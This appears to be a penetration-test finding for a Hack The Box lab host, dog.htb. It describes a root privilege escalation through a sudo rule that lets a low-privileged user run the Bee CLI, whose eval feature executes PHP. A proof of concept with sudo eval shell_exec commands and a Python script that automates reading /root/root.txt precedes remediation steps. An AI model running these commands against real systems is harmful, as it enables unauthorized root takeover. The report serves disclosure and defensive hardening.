# Local Privilege Escalation via Sudo Permission on Bee CLI

**ID:** vuln-0002
**Severity:** HIGH
**Found:** 2026-02-28 19:23:22 UTC
**Target:** dog.htb
**CWE:** CWE-269
**CVSS:** 7.8

## Description

A local privilege escalation vulnerability was confirmed on dog.htb. The low-privileged user account `johncusack` is allowed to execute `/usr/local/bin/bee` as root through sudo without additional restrictions that prevent command execution features.

The Bee CLI provides an `eval` capability that executes PHP code within the application context. By invoking `shell_exec()` from this eval context, an attacker can execute arbitrary operating system commands as root.

This creates a direct and reliable path from an unprivileged local user to full root compromise.

## Impact

An attacker with access to the `johncusack` account can obtain full root command execution without exploiting memory corruption or kernel weaknesses.

Business and security impact includes complete loss of confidentiality, integrity, and availability on the host:
- Read and exfiltrate sensitive system and application data
- Modify system files, persistence mechanisms, and authentication material
- Disable services or security controls
- Fully compromise challenge objectives (including privileged flag access)

This is a full host takeover condition.

## Technical Analysis

The root cause is overly permissive sudo delegation to `/usr/local/bin/bee` for a non-root user. The delegated command includes functionality (`eval`) that permits dynamic code execution. Because sudo runs Bee with effective UID 0, any command reached through eval executes with root privileges.

Observed exploitation chain:
- `sudo -l` for user `johncusack` shows permission to run `/usr/local/bin/bee` as root.
- Bee accepts `--root=/var/www/html eval '...'` and executes supplied PHP.
- PHP `shell_exec("id; ...")` returns output from root context, confirming privilege escalation.

This is a command execution primitive exposed through privileged tooling, not a sandbox escape. Restricting shell access while keeping eval-enabled sudo delegation is insufficient, because eval itself is the escalation mechanism.

## Proof of Concept

Reproduction steps:

1. Obtain an interactive shell as user `johncusack` on dog.htb.

2. Confirm sudo delegation:
   `sudo -l`
   Verify output includes:
   `(ALL : ALL) /usr/local/bin/bee`

3. Execute Bee eval to run system commands as root:
   `sudo /usr/local/bin/bee --root=/var/www/html eval 'echo shell_exec("id");'`

4. Confirm root context in command output:
   Expected: `uid=0(root) gid=0(root) ...`

5. Optional high-impact validation:
   `sudo /usr/local/bin/bee --root=/var/www/html eval 'echo shell_exec("cat /root/root.txt");'`
   Successful output confirms unrestricted root-level file access.

```
#!/usr/bin/env python3
import subprocess
import shlex

def run(cmd: str):
    p = subprocess.run(
        cmd,
        shell=True,
        text=True,
        capture_output=True
    )
    return p.returncode, p.stdout.strip(), p.stderr.strip()

def main():
    print("[*] Checking sudo privileges")
    rc, out, err = run("sudo -l")
    print(out if out else err)

    if "/usr/local/bin/bee" not in (out + err):
        print("[!] Required sudo rule not found; target may not be vulnerable in this context.")
        return 1

    payload = """sudo /usr/local/bin/bee --root=/var/www/html eval 'echo shell_exec("id; whoami; cat /root/root.txt 2>/dev/null");'"""
    print("[*] Executing Bee eval payload")
    rc, out, err = run(payload)

    print("---- STDOUT ----")
    print(out)
    print("---- STDERR ----")
    print(err)

    if "uid=0(root)" in out:
        print("[+] Privilege escalation confirmed: command execution as root")
        return 0

    print("[!] Root context not confirmed")
    return 2

if __name__ == "__main__":
    raise SystemExit(main())
```

## Remediation

1. Remove or tightly restrict sudo permission for `/usr/local/bin/bee` from non-administrative accounts.
2. If Bee must be delegated, enforce least privilege by:
   a) Limiting allowed subcommands to non-executable maintenance operations only.
   b) Explicitly denying `eval` and any command/path options that can execute code.
3. Replace broad sudoers rule with a narrowly scoped wrapper script that validates fixed arguments and denies dynamic input.
4. Apply `NOPASSWD` only where strictly necessary and only for non-dangerous commands.
5. Audit all sudoers entries for similar privilege-escalation primitives (`eval`, shell, interpreter, plugin loaders).
6. Rotate credentials/secrets and perform host integrity review to detect persistence after remediation.
7. Re-test by verifying `johncusack` can no longer obtain root command execution through Bee or equivalent delegated tools.
